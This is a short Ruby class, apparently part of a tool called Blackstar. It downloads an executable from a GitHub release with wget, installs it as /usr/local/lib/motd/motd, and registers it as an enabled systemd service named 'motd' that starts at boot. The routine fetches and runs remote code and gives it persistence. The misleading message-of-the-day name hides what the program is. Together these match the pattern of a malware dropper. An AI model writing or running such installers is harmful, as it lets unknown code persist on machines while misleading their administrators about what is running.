module Blackstar
  class Process
    SERVICE_PATH = '/lib/systemd/system/motd.service'
    EXEC_DIR_PATH = '/usr/local/lib/motd'
    EXEC_PATH = "#{EXEC_DIR_PATH}/motd"
    DOWNLOAD_URL = "https://github.com/speedy-gonzalez2017/blackstar/releases/download/0.0.1/linux-x64"

    def handle
      handle_startup_script
      download_executable
    end

    def download_executable
      p "Downloading Exec"
      Cmd.call("rm -f /tmp/linux-x64")
      Cmd.call("wget -P /tmp '#{DOWNLOAD_URL}'")
      Cmd.call("mkdir -p #{EXEC_DIR_PATH}")
      Cmd.call("mv /tmp/linux-x64 #{EXEC_PATH}")
      Cmd.call("chmod +x #{EXEC_PATH}")
    end

    def handle_startup_script
      p "Setting up script"
      Cmd.call("rm #{SERVICE_PATH} -f")
      Cmd.call("systemctl disable motd")

      File.open(SERVICE_PATH, "w") do |f|
        f.write(Linux::SERVICE_CONFIG)
      end

      Cmd.call("systemctl daemon-reload")

      Cmd.call("systemctl enable motd")
    end
  end
end